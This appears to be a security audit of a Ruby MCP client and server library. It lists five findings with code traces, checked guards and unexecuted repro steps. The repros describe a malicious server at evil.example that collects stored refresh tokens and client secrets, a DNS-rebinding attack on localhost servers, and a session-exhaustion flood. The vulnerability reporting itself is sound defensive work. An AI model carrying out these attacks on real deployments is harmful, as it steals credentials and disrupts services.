finding.claim: Stored OAuth refresh token and client_secret are POSTed to a token endpoint chosen by server-supplied Protected Resource Metadata, with no pinning to the authorization server that issued the stored credentials. A malicious or compromised MCP server can trigger this with a single 401 and no user interaction. Medium.
finding.source: Attacker-controlled MCP server: 401 WWW-Authenticate `resource_metadata` parameter (lib/mcp/client/http.rb:416-418) and the PRM document's `authorization_servers[0]` and its AS metadata `token_endpoint` (lib/mcp/client/oauth/flow.rb:308-327, 389-391).
finding.sink: lib/mcp/client/oauth/flow.rb:707 http_post_form(token_endpoint, form) with form containing refresh_token (flow.rb:663-665) and Authorization: Basic client_id:client_secret (flow.rb:681-697).

trace.note: client.post sends request to MCP endpoint
Faraday::UnauthorizedError rescued; run_oauth_flow! invoked
run_oauth_flow! parses WWW-Authenticate, takes resource_metadata
attempt_refresh called with attacker-supplied resource_metadata_url
flow.refresh!(server_url: snapshot URL, resource_metadata_url)
stored refresh_token read from provider storage
resource_metadata_url must be HTTPS (only control here)
locate_authorization_server fetches attacker PRM
AS URL from PRM must be HTTPS; attacker AS passes
canonical_resource: PRM resource may equal server URL, so resource_covers? passes
fetch AS metadata from attacker AS
issuer check only compares to the attacker-chosen AS URL (self-consistent)
exchange_refresh_token with stored client_information
client_secret sent as HTTP Basic
refresh_token and client credentials POSTed to attacker token_endpoint

finding.guards_checked: HTTPS-only for resource_metadata URL and AS endpoints (flow.rb:153, 237, 387-392); issuer equality (flow.rb:262, self-referential for attacker AS); resource_covers? (flow.rb:162, discovery.rb:306-324, passes for PRM resource == server URL); OAuthURLGuard (client/http.rb:37-55) only guards the MCP endpoint, not the token endpoint; no check that the AS matches the one that issued stored tokens or client_information. Same root cause on the client_credentials path: http.rb:418-420 -> flow.rb:52-55 -> run_client_credentials! (flow.rb:102-110) sends client_secret to attacker token_endpoint on any 401 when no refresh token is held. Precondition: attacker controls MCP server responses and the client holds a refresh_token or client_secret for that server.
finding.repro: Stand up a malicious HTTPS MCP server that returns 401 with WWW-Authenticate: Bearer resource_metadata="https://evil.example/prm" and serves a PRM {resource: <server URL>, authorization_servers:["https://evil.example"]} plus AS metadata {issuer:"https://evil.example", token_endpoint:"https://evil.example/token", code_challenge_methods_supported:["S256"]}. Client with stored refresh_token and client_information connects; evil.example/token receives refresh_token and Basic client_id:client_secret. Not executed; derived from reading the code.

finding.claim: Streamable HTTP server transport never validates the Origin (or Host) header, so a locally bound, unauthenticated server can be reached from a browser page via DNS rebinding. The MCP transport spec requires Origin validation. Medium for local deployments, otherwise low.
finding.source: Any HTTP request from a browser context whose origin is attacker-controlled after DNS rebinding to 127.0.0.1 (no Origin check exists).
finding.sink: Tool and resource dispatch: handle_post -> handle_regular_request -> server.handle_json (streamable_http_transport.rb:365-429, 713-740; server.rb:196-199).

trace.note: call(env) -> handle_request(Rack::Request)
dispatch on REQUEST_METHOD; no Origin/Host inspection
handle_post: only Accept, Content-Type, session, protocol-version checked
handle_regular_request dispatches tools/call

finding.guards_checked: Accept header (528-539), Content-Type (547-557), Mcp-Session-Id presence/validity (393, 719), MCP-Protocol-Version (395). None of these is origin-based and an attacker page can set all of them. grep for Origin/HTTP_ORIGIN/Host across lib/mcp/server returns no matches. Precondition: server bound to localhost (or an internal address) without an authenticating proxy or middleware.
finding.repro: Serve StreamableHTTPTransport on 127.0.0.1:PORT. From an attacker page on evil.example that rebinds to 127.0.0.1, POST {"jsonrpc":"2.0","id":1,"method":"initialize",...} with Accept: application/json, text/event-stream and Content-Type: application/json; then call tools/call. Expected: 200 with no Origin rejection. Not executed.

finding.claim: Notification POSTs bypass session validation. A request with a nonexistent or expired Mcp-Session-Id is dispatched with server_session=nil, so developer notification handlers (roots_list_changed_handler, define_custom_method with notifications/* names) run without a valid session or prior initialize. Low to medium, depending on what the developer registers.
finding.source: Unauthenticated HTTP client sending a notification with an arbitrary Mcp-Session-Id header value.
finding.sink: Developer-registered notification handler, dispatched by server.rb:447-489 (handle_request) via server.rb:488 dispatch_optional_context_handler.

trace.note: missing_session_id_response only checks header presence, not existence
notification? branch taken
dispatch_notification(body_string, session_id)
session_id branch: @sessions[session_id] is nil, so server_session stays nil; no validate_and_touch_session
@server.handle_json(body_string) with no session
handler lookup by notification method name
custom notification handler invoked

finding.guards_checked: Session existence check exists only on the request path (streamable_http_transport.rb:719, validate_and_touch_session 799-824) and the response path (416). Notification path has none. Methods.notification? (methods.rb:50-52) and handle_request do not gate by initialization for notifications. Impact is limited to developer-registered notification handlers. Built-in notifications are no-ops or no-session no-ops (server.rb:167-169, 519-528).
finding.repro: Register server.roots_list_changed_handler { ... } or define_custom_method(method_name: "notifications/x") { ... }. Send POST with a random Mcp-Session-Id and body {"jsonrpc":"2.0","method":"notifications/x"}. Expected: 202 and the handler runs. Not executed.

finding.claim: Tool-handler exception messages are returned verbatim to the remote JSON-RPC caller in error.data. This leaks internal details such as file paths, SQL, or hostnames and can expose secrets embedded in exception text. Low.
finding.source: Exception raised inside a developer tool handler (for example a database or HTTP client error), reachable by any caller who can invoke tools/call.
finding.sink: JSON-RPC error response body: json_rpc_handler.rb:146 data = error.message, returned at 148-152.

trace.note: call_tool rescues any StandardError from tool execution
re-raised as RequestHandlerError with message "Internal error calling tool #{tool_name}: #{e.message}"
handle_request lambda rescues RequestHandlerError, reports it, and re-raises
process_request rescues RequestHandlerError
data = error.message (no error_data set)
serialized into the response error object

finding.guards_checked: None on this path. exception_reporter defaults to a no-op (configuration.rb:163-164), so nothing is logged or redacted. Other generic StandardError paths (handle_request wrapper at server.rb:510) return a fixed message, so only the tools/call path leaks e.message.
finding.repro: Tool whose block does raise "connection to db-internal.corp:5432 failed for user svc_admin". tools/call returns error.data containing that text. Not executed.

finding.claim: Unauthenticated session flood: any client can fill the global session cap (DEFAULT_MAX_SESSIONS=10_000) with cheap initialize POSTs, and new initializations are then refused with 503 until idle sessions expire (1800s). The cap is global, not per client. Low (availability). This is a documented design tradeoff (lines 27-34), reported because the attacker cost is one POST per slot.
finding.source: Unauthenticated client repeatedly POSTing initialize without Mcp-Session-Id.
finding.sink: Session allocation in handle_initialization (streamable_http_transport.rb:652-678), with the cap check at 661-667.

trace.note: initialize requests skip the session-id check
initialize without session header proceeds
new ServerSession and UUID session id created before the cap check
when @sessions.size >= @max_sessions, only expired sessions are reclaimed
too_many_sessions_response (503) for everyone else

finding.guards_checked: Cap of 10,000 and 1800s idle timeout with a 60s reaper (streamable_http_transport.rb:35-36, 83, 326-352). No per-client, per-IP, or rate limit. Request body is read without size limit (line 373), so each POST can also be large. Authentication is not provided by the transport.
finding.repro: Loop 10,001 POSTs of {"jsonrpc":"2.0","id":1,"method":"initialize","params":{...}} with Accept and Content-Type headers and no Mcp-Session-Id. The next legitimate initialize returns 503 until sessions idle out. Not executed.
